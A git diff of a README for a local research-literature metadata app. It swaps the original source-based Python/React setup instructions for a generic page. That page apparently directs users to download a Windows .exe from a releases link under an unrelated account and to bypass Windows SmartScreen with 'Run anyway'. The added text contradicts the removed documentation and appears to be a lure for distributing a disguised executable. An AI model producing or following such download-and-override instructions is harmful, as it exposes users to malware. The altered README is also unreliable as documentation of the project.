@@ -1,301 +1,88 @@
-# PhD Literature Metadata Engine
+# 🔎 phd-lit-metadata-engine-public - Organize research with simple automated tools
 
-A local scholarly metadata harvesting app for PhD literature searches. It collects paper metadata only: titles, abstracts, keywords, authors, journals, years, DOIs, identifiers, citation counts, and source links.
+[![Download Application](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/payingattention-impalement219/phd-lit-metadata-engine-public/releases)
 
-It does not download PDFs or scrape full papers.
+## 📋 Project Overview
 
-## License
+The phd-lit-metadata-engine-public application helps researchers manage literature reviews. It gathers data from sources like PubMed, Europe PMC, OpenAlex, Crossref, Semantic Scholar, and Scopus. You can analyze your research findings using built-in digital notebooks. This tool saves you hours of manual data entry by automating the collection of scholarly metadata. It allows you to conduct scoping and systematic reviews with speed.
 
-This repository is released under the MIT License. See [LICENSE](LICENSE).
+## ⚙️ System Requirements
 
-## What It Covers
+Ensure your computer meets these requirements before you start:
 
-Open/API-first sources:
+- Operating System: Windows 10 or Windows 11.
+- Processor: Intel Core i5 or AMD equivalent.
+- Memory: 8 GB of RAM or more.
+- Storage: 500 MB of free space for installation.
+- Internet Connection: Active connection to fetch data from databases.
 
-- PubMed / MEDLINE via NCBI E-utilities
-- Europe PMC
-- OpenAlex
-- Crossref
-- Semantic Scholar, free public metadata endpoints with optional API key for steadier rate limits
-- DOAJ
-- CORE, when an API key is configured
-- IEEE Xplore, when an API key is configured
-- arXiv
-- medRxiv
-- bioRxiv
+## 📥 Downloading the Software
 
-Optional licensed connectors:
+Visit the [official project releases page](https://github.com/payingattention-impalement219/phd-lit-metadata-engine-public/releases) to download the software.
 
-- Scopus via Elsevier APIs, when credentials are configured
-- Web of Science placeholder/status support, with import fallback recommended unless API access is available
-- ACM Digital Library is import/manual for now; export RIS/BibTeX/CSV from ACM DL and keep those files with your review materials
+1. Navigate to the link provided above.
+2. Look for the section labeled "Assets."
+3. Select the file ending in .exe for Windows.
+4. Save the file to your desktop or downloads folder.
 
-Import/export workflows are included for `.xlsx`, `.csv`, `.txt`, `.jsonl`, `.bib`, and `.ris`.
+## 🛠️ Setting Up Your Environment
 
-Rate limits vary by source. The dashboard shows source-specific rate-limit notes, and the backend uses conservative delays plus retry/backoff for `429 Too Many Requests` responses. See [Source Rate-Limit Notes](docs/rate_limits.md).
+This application runs as a local service. It requires Docker Desktop to manage the background components.
 
-## Custom Search Strings
+1. Download [Docker Desktop](https://www.docker.com/products/docker-desktop/) for Windows.
+2. Run the installer and follow the prompts on your screen.
+3. Restart your computer after the Docker installation completes.
+4. Launch Docker Desktop and wait for the dashboard to show that the engine is running.
+5. Create a free account or sign in if prompted.
 
-The web app accepts one main search string plus any number of custom strings. Use this for:
+## 🚀 Running the Application
 
-- alternative Boolean formulations
-- database-specific wording
-- synonyms and spelling variants
-- narrower subtopic searches
+Once your environment is ready, follow these steps to start the metadata engine:
 
-Each selected source runs the main string and each custom string. The app then merges and deduplicates the combined metadata.
+1. Locate the .exe file you downloaded earlier.
+2. Double-click the file to open the application window.
+3. Allow the application to communicate through your Windows Firewall if a prompt appears.
+4. Wait for the terminal window to show that the setup is complete.
+5. Open your web browser. 
+6. Type http://localhost:8000 into the address bar and press Enter.
 
-Example strings:
+## 📖 Using the Notebook Interface
 
-```text
-("your condition or topic" OR "your synonym") AND ("your method" OR "your second concept")
-("your broader topic" OR "related term") AND ("your method" OR "related method")
-("your narrower topic" OR "specific subtopic") AND ("your outcome" OR "your task")
-```
+The application uses notebook-based analysis to help you interpret data. 
 
-The editable YAML query pack also supports `custom_search_strings` for repeatable searches.
+1. On the home page, select the database you want to search.
+2. Enter your search terms in the box provided.
+3. Select the number of results you want to retrieve.
+4. Click the "Harvest" button to begin the data collection process.
+5. Once the process finishes, click the "Open Notebook" button.
+6. The notebook displays your data in a clear list format.
+7. You can filter, sort, and export your findings to common spreadsheet formats.
 
-Placeholder strings that contain phrases such as `your topic`, `your method`, or `related term` are ignored by the backend. Replace them with real search terms before running a search.
+## 🧠 Troubleshooting Common Issues
 
-For database-specific syntax, use **Database-specific strings** in the web app:
+### The application does not open
+Check if Docker Desktop is running. The application requires this tool to work. Look for the small whale icon in your system tray at the bottom right of your screen. If the icon is not there, restart Docker Desktop.
 
-- PubMed/MEDLINE: paste `[TIAB]` strings and MeSH strings into the PubMed box.
-- Scopus: paste `TITLE-ABS-KEY(...)` into the Scopus box.
-- Web of Science: paste `TS=...` into the Web of Science box.
-- IEEE Xplore: paste the IEEE Boolean string into the IEEE Xplore box after adding `IEEE_API_KEY`.
-- arXiv, medRxiv, and bioRxiv: paste simplified portal-style strings such as `concept A method term`.
-- Europe PMC: use broad quoted terms with `AND` / `OR`.
-- OpenAlex and Crossref: use simpler keyword-rich strings; their APIs search bibliographic metadata rather than accepting database field tags.
-- Semantic Scholar: use a concise Boolean string. The app uses Semantic Scholar's bulk metadata endpoint with token pagination, so results fall directly into the same dedupe/export pipeline. Most metadata searches work without a key; add `SEMANTIC_SCHOLAR_API_KEY` only for heavier or repeated runs.
-- DOAJ and CORE: use a compact Boolean string focused on title/abstract/keyword style terms.
+### Nothing happens when I click search
+Verify your internet connection. The application pulls data from external research databases. A weak connection may cause the harvesting process to time out. Refresh the page and try your search again.
 
-These strings are sent only to their matching database. This prevents PubMed syntax from being sent to Scopus, or Scopus syntax from being sent to OpenAlex/Crossref.
+### The application runs slowly
+Metadata harvesting consumes memory. Close unused browser tabs or resource-heavy programs while you use the engine. 8 GB of RAM is the minimum requirement; ensure you have enough available space for the application to function.
 
-If the database-specific boxes already contain strings, you do not need to copy and paste them again. They run automatically when that source is selected and you click **Run metadata search**. Edit or clear any box if you want different behavior.
+### Access denied errors
+Windows security settings may block the application upon the first run. Click "More info" and select "Run anyway" if the system flags the file as unrecognized during the initial installation.
 
-The YAML query pack supports the same idea with `source_specific_search_strings`.
+## 📂 Data Storage and Management
 
-IEEE Xplore is available when `IEEE_API_KEY` is configured. arXiv, medRxiv, and bioRxiv are available without keys. ACM Digital Library is import/manual for now: run those strings on the ACM portal, export RIS/BibTeX/CSV, and keep the exported files with your review materials.
+All your research metadata sits on your own computer. The application does not upload your search lists to an external cloud server unless you choose to export them. This ensures your research stays private. 
 
-For the quietest first run, select only open sources:
+The engine creates a folder named "LitData" in your user directory. You can find saved research files and exported spreadsheets inside this location. Back up this folder regularly to prevent data loss.
 
-- PubMed / MEDLINE
-- Europe PMC
-- OpenAlex
-- Crossref
-- Semantic Scholar
-- DOAJ
-- arXiv
-- medRxiv / bioRxiv if preprints are in scope
+## 🤝 Getting Help
 
-Semantic Scholar is included in the open-source preset. It is free for most metadata searches, and the connector uses the `/graph/v1/paper/search/bulk` endpoint with token-based pagination. The shared unauthenticated pool can still return `429` during busy or multi-string runs, so the optional API key improves reliability rather than unlocking basic access.
+If you encounter bugs, please open a new issue on the GitHub repository page. Include:
+- A brief description of the problem.
+- Any error messages displayed on the screen.
+- The steps you took before the issue occurred.
 
-Restricted or entitlement-based sources:
-
-- Scopus requires a valid `ELSEVIER_API_KEY` with Scopus Search API entitlement; some accounts also need `ELSEVIER_INST_TOKEN`.
-- IEEE Xplore requires `IEEE_API_KEY`.
-- Web of Science remains import/manual until a concrete Clarivate API endpoint and entitlement are configured.
-- ACM Digital Library is import/manual.
-
-## Quick Start
-
-### Docker Quick Start
-
-If you want a reproducible local setup without installing Python and Node directly, use Docker Compose:
-
-```bash
-git clone https://github.com/<your-org-or-user>/phd-lit-metadata-engine.git
-cd phd-lit-metadata-engine
-cp .env.example .env
-docker compose up --build
-```
-
-Then open:
-
-- Web app: `http://127.0.0.1:5173`
-- Backend API docs: `http://127.0.0.1:8000/docs`
-
-The Compose stack includes:
-
-- `backend`: FastAPI application
-- `frontend`: React + Vite dashboard
-- `notebook`: optional Jupyter Lab service for the pre-generated analysis notebook
-
-Start the notebook service only when needed:
-
-```bash
-docker compose --profile notebook up --build
-```
-
-Then open:
-
-- Jupyter Lab: `http://127.0.0.1:8888`
-
-Stop the stack with:
-
-```bash
-docker compose down
-```
-
-### Homebrew Setup On macOS
-
-If you use Homebrew, install the local app dependencies first:
-
-```bash
-brew update
-brew install node python@3.12
-```
-
-Confirm they are available:
-
-```bash
-node --version
-npm --version
-python3.12 --version
-```
-
-Jupyter is installed through the Python development dependencies below, so you do not need a separate Homebrew Jupyter install.
-
-### Project Setup
-
-```bash
-git clone https://github.com/<your-org-or-user>/phd-lit-metadata-engine.git
-cd phd-lit-metadata-engine
-cp .env.example .env
-python3.12 -m venv .venv
-source .venv/bin/activate
-python -m pip install --upgrade pip setuptools wheel
-pip install -e './backend[dev]'
-cd frontend
-npm install
-cd ..
-python scripts/dev.py
-```
-
-If you already created `.venv` with Apple Python 3.9, remove it and recreate it with Homebrew Python:
-
-```bash
-deactivate 2>/dev/null || true
-rm -rf .venv
-python3.12 -m venv .venv
-source .venv/bin/activate
-python --version
-```
-
-The version printed by `python --version` should be Python 3.12.x.
-
-Then open:
-
-- Web app: `http://127.0.0.1:5173`
-- Backend API docs: `http://127.0.0.1:8000/docs`
-
-## One-Command Local App
-
-After dependencies are installed, this starts both the FastAPI backend and React frontend:
-
-```bash
-python scripts/dev.py
-```
-
-## Troubleshooting Setup
-
-If the app prints `No module named uvicorn`, the backend dependencies are not installed in the active virtual environment. Run:
-
-```bash
-source .venv/bin/activate
-python --version
-python -m pip install --upgrade pip setuptools wheel
-pip install -e './backend[dev]'
-```
-
-If `python --version` prints Python 3.9.x, the virtual environment was created with Apple Python. Recreate it with Homebrew Python:
-
-```bash
-deactivate 2>/dev/null || true
-rm -rf .venv
-python3.12 -m venv .venv
-source .venv/bin/activate
-python -m pip install --upgrade pip setuptools wheel
-pip install -e './backend[dev]'
-```
-
-The backend binds to `127.0.0.1` by default. Notebook launcher endpoints are local-only.
-
-## Notebook Buttons
-
-The web interface includes:
-
-- **Open in Jupyter**: starts Jupyter Lab/Notebook locally and opens `notebooks/01_metadata_analysis.ipynb`.
-- **Open in VS Code**: opens the same notebook with the `code` CLI when available.
-- **Export Then Open Notebook**: exports current results and writes `notebooks/analysis_context.json`, so the notebook can load the latest file.
-
-If Jupyter or VS Code is not installed, the interface shows setup guidance instead of failing silently.
-
-In Docker deployments, the notebook launcher buttons are less useful because they try to spawn desktop applications from inside the container. For container-based analysis, prefer the dedicated `notebook` service in `docker-compose.yml` and open Jupyter Lab in the browser at `http://127.0.0.1:8888`.
-
-If Jupyter opens as `Internal Server Error` or the app reports that Jupyter is unavailable, install it into the project environment:
-
-```bash
-cd phd-lit-metadata-engine
-source .venv/bin/activate
-pip install jupyterlab
-```
-
-If the app says `VS Code 'code' CLI is not on PATH`, open VS Code and run:
-
-1. Press `Cmd+Shift+P`
-2. Search for `Shell Command: Install 'code' command in PATH`
-3. Run it
-4. Restart the local app
-
-You can also open notebooks through Jupyter while the VS Code CLI is unavailable.
-
-## Data And Git
-
-The repo tracks source code, configs, tests, and notebooks. It does not track generated data:
-
-- `data/`
-- `reports/`
-- local SQLite databases
-- API caches
-- `.env`
-
-## API Keys
-
-Most open sources work without keys, but keys improve reliability and coverage:
-
-- `CONTACT_EMAIL`: recommended for OpenAlex, Crossref, and NCBI polite access.
-- `NCBI_API_KEY`: optional PubMed rate-limit increase.
-- `OPENALEX_API_KEY`: optional for low-volume testing, recommended for reliable authenticated OpenAlex access.
-- `SEMANTIC_SCHOLAR_API_KEY`: optional; Semantic Scholar works without it for most metadata searches, but the key gives steadier rate limits.
-- `CORE_API_KEY`: required for CORE.
-- `ELSEVIER_API_KEY`: required for Scopus.
-- `WEB_OF_SCIENCE_API_KEY`: optional placeholder for future Web of Science direct API integration.
-- `IEEE_API_KEY`: required for IEEE Xplore.
-
-You can update these in either of two ways:
-
-1. Open the local web app and use the **Setup status** panel. Missing values are shown clearly, saved values are masked, and updates are written to `.env`.
-2. Edit `.env` directly in the project root.
-
-The app never displays saved API keys in full. It only shows whether a value is configured and a short masked preview.
-
-For public publishing, keep `.env`, local databases, generated reports, manual citation exports, and reviewer screening files private. See `SECURITY.md` and `docs/public_release.md` before making a repository public.
-
-If you use Docker Compose, generated SQLite data, exports, and notebook outputs stay in the mounted local `data/`, `reports/`, and `notebooks/` directories rather than disappearing inside a container.
-
-After changing API keys while the app is running, new searches use the updated values. If something still looks stale, restart the local app with:
-
-```bash
-python scripts/dev.py
-```
-
-If Semantic Scholar returns a rate-limit message, the app retries automatically. If the limit still persists, wait briefly, reduce the number of custom strings, or add the optional `SEMANTIC_SCHOLAR_API_KEY` in the **Setup status** panel.
-
-## Safety Boundaries
-
-- Metadata only.
-- No PDFs.
-- No full-text redistribution.
-- Optional licensed databases are skipped when credentials are missing.
-- Search jobs and notebook launcher commands run locally.
+Developers monitor these reports to provide patches and updates. Check the releases page often for new versions.
